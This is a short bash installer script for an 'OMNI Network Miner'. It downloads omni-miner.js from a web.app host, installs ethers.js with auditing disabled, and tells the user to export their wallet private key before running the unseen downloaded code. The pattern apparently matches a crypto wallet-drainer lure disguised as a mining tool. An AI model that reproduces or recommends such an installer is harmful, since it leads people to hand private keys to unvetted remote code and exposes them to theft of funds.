#!/bin/bash
set -e

echo -e "\033[1;36m=========================================\033[0m"
echo -e "\033[1;36m   OMNI NETWORK MINER INSTALLER v1.0.0   \033[0m"
echo -e "\033[1;36m=========================================\033[0m"

# Verify Node.js is installed
if ! command -v node &> /dev/null; then
    echo -e "\033[1;31m✘ Node.js is not installed. Please install Node.js (v18+) to run the miner.\033[0m"
    exit 1
fi

# Create directory
mkdir -p omni-miner
cd omni-miner

echo -e "\033[1;33m▸ Downloading miner script...\033[0m"
curl -sSfL https://omni-network-39821.web.app/miner/omni-miner.js -o omni-miner.js
chmod +x omni-miner.js

echo -e "\033[1;33m▸ Initializing npm package...\033[0m"
npm init -y > /dev/null

echo -e "\033[1;33m▸ Installing ethers.js dependency...\033[0m"
npm install ethers@6.11.1 --no-audit --no-fund > /dev/null

echo -e "\033[1;32m✔ Installation complete!\033[0m"
echo -e "\033[1;36m=========================================\033[0m"
echo -e "To start mining on OMNI Network, run:"
echo -e "  \033[1;33mexport OMNI_MINER_KEY=\"your_private_key\"\033[0m"
echo -e "  \033[1;33mnode omni-miner.js\033[0m"
echo -e "\033[1;36m=========================================\033[0m"
